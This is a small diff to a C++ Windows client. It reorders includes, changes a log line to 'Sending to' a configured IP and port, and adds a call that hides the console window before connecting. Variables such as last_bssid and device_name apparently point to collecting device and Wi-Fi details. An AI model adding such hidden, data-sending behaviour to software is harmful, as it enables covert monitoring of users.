@@ -1,5 +1,5 @@
-#include <iostream>
 #include <string>
+#include <iostream>
 #include <windows.h>
 #include "driver_client.hpp"
 #include "client_data.hpp"
@@ -13,9 +13,10 @@ std::string last_bssid;
 std::string device_name;
 
 int main() {
-    std::cout << "starting client" << std::endl;
-    std::cout << IP << ":" << PORT << std::endl;
+    std::cout << "Sending to: " << IP << ":" << PORT << std::endl;
 
+    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+    
     DriverClient client;
     client.connectClient(IP, PORT);
 
